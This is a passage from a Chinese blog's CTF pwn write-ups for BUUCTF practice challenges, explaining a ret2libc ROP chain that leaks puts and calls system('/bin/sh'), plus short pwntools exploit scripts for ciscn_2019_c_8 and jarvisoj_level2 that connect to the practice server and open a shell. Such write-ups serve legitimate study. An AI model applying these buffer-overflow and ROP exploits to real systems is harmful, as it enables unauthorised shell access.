encrypted\n&quot;,payload)</code>：发送payload给远程服务，用于触发漏洞。</p></li><li><p><code>io.recvuntil(b&quot;Ciphertext\n&quot;)</code>：接收远程服务发送的数据，直到遇到字符串”Ciphertext\n”。</p></li><li><p><code>io.recvuntil(b&quot;\n&quot;)</code>：接收远程服务发送的数据，直到遇到换行符。</p></li><li><p><code>puts_addr = u64(io.recvline().strip().ljust(8,b&#39;\0&#39;))</code>：接收远程服务发送的数据，将其转换为64位整数，即<code>puts</code>函数的真实地址。</p></li><li><p><code>libc = LibcSearcher(&quot;puts&quot;,puts_addr)</code>：创建LibcSearcher对象，以便后续通过<code>puts</code>函数地址查找libc基址和其他函数地址。</p></li><li><p><code>libcbase = puts_addr - libc.dump(&#39;puts&#39;)</code>：计算libc基址。</p></li><li><p><code>system_addr = libcbase + libc.dump(&#39;system&#39;)</code>：计算<code>system</code>函数的地址。</p></li><li><p><code>str_bin_sh = libcbase + libc.dump(&#39;str_bin_sh&#39;)</code>：计算<code>&quot;/bin/sh&quot;</code>字符串的地址。</p></li><li><p><code>payload = b&#39;a&#39; * (0x50 + 0x08) + p64(ret) + p64(pop_rdi_ret) + p64(str_bin_sh) + p64(system_addr) + p64(main_addr)</code>：构造新的payload，其中包括填充数据、ROP链和<code>/bin/sh</code>字符串地址。这个ROP链的作用是调用<code>system(&quot;/bin/sh&quot;)</code>函数。</p></li></ol></blockquote><h3 id="3-总结"><a href="#3-总结" class="headerlink" title="(3)总结"></a>(3)总结</h3><p>通过漏洞泄露<code>puts</code>函数的真实地址，并计算出libc基址。然后，构造合适的ROP链来调用<code>system</code>函数，并传递<code>&quot;/bin/sh&quot;</code>字符串作为参数，从而获取shell权限。</p><ol><li>找到函数地址：首先，使用<code>ELF</code>模块获取目标二进制文件中函数的地址。在脚本中，通过<code>elf.plt</code>和<code>elf.got</code>来获取<code>puts</code>函数的<code>plt</code>和<code>got</code>表项的地址，以及<code>encrypt</code>和<code>main</code>函数的地址。</li><li>构造漏洞触发payload：在脚本中，通过构造一系列的字节串来构造payload。首先，用<code>b&#39;a&#39; * (0x50 + 0x08)</code>填充到缓冲区，然后利用<code>pop_rdi_ret</code>和<code>puts_got</code>地址，以及<code>puts_plt</code>函数的地址，构造ROP链。最后，使用<code>encrypt</code>函数的地址，将payload发送给目标程序。</li><li>泄露libc基址和获取系统函数地址：通过接收目标程序返回的数据，获取泄露的<code>puts</code>函数的地址。然后，使用<code>LibcSearcher</code>模块根据泄露的<code>puts</code>函数地址来搜索libc库，并计算出libc基址。最后，通过libc基址计算出<code>system</code>函数的地址和<code>/bin/sh</code>字符串的地址。</li><li>构造第二个payload：使用泄露的libc基址、<code>ret</code>指令地址、<code>pop_rdi_ret</code>指令地址和<code>/bin/sh</code>字符串地址，构造第二个payload。ROP链的顺序为：<code>ret</code>、<code>pop_rdi_ret</code>、<code>/bin/sh</code>、<code>system</code>、<code>main</code>。</li><li>发送第二个payload获取shell：将第二个payload发送给目标程序，成功获取到shell。</li></ol><h2 id="9-ciscn-2019-c-8"><a href="#9-ciscn-2019-c-8" class="headerlink" title="9.ciscn_2019_c_8"></a>9.ciscn_2019_c_8</h2><h3 id="1-解题思路-5"><a href="#1-解题思路-5" class="headerlink" title="(1)解题思路"></a>(1)解题思路</h3><p>例行检查，发现保护全开了</p><p><img src="/.com//1~10/image-20230525194900327.png" alt="image-20230525194900327"></p><p>进入IDA看一下</p><p><img src="/.com//1~10/image-20230525195520113.png" alt="image-20230525195520113">发现只需要让var[13] &#x3D; 17 就可以调用system函数了</p><p>这里需要注意：</p><blockquote><p>&#x3D;&#x3D;qword全称是Quad Word。2个字节就是1个Word（1个字，16位），q就是英文quad-这个词根（意思是4）的首字母，所以它自然是word（2字节，0~2^16-1）的四倍，8字节&#x3D;&#x3D;</p></blockquote><p>所以代码的意思是要将var[13]之后的8个字节的数据赋值为17。</p><h3 id="（2）payload"><a href="#（2）payload" class="headerlink" title="（2）payload"></a>（2）payload</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">29179</span>)<br>p.sendline(p32(<span class="hljs-number">17</span>)*<span class="hljs-number">14</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="10-jarvisoj-level2"><a href="#10-jarvisoj-level2" class="headerlink" title="10.jarvisoj_level2"></a>10.jarvisoj_level2</h2><h3 id="1-解题思路-6"><a href="#1-解题思路-6" class="headerlink" title="(1)解题思路"></a>(1)解题思路</h3><p>例行检查</p><p><img src="/.com//1~10/image-20230530204940268.png" alt="image-20230530204940268"></p><p>IDA中函数很简单，</p><p>开了NX就不能用shellcode了，另外程序没有开canary（栈溢出检测）、内存地址随机化（PIE），所以用基本的ROP</p><p>找system和\bin\sh地址</p><p><img src="/.com//1~10/image-20230530211058479.png" alt="image-20230530211058479"></p><p>system_addr&#x3D;0x8048320</p><p>shell_addr&#x3D;0x804a024</p><p>buf的大小是0x88，读入的数据大小是0x100，可以溢出0x78个字节</p><h3 id="2-payload"><a href="#2-payload" class="headerlink" title="(2)payload"></a>(2)payload</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><br>io=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28703</span>)<br>shell_addr=<span class="hljs-number">0x804a024</span><br>system_addr=<span class="hljs-number">0x8048320</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x88</span>+<span class="hljs-number">4</span>)+p32(system_addr)+p32(<span class="hljs-number">8</span>)+p32(shell_addr)<br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
      <category>pwn练习记录</category>
      
      <category>BUUCTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
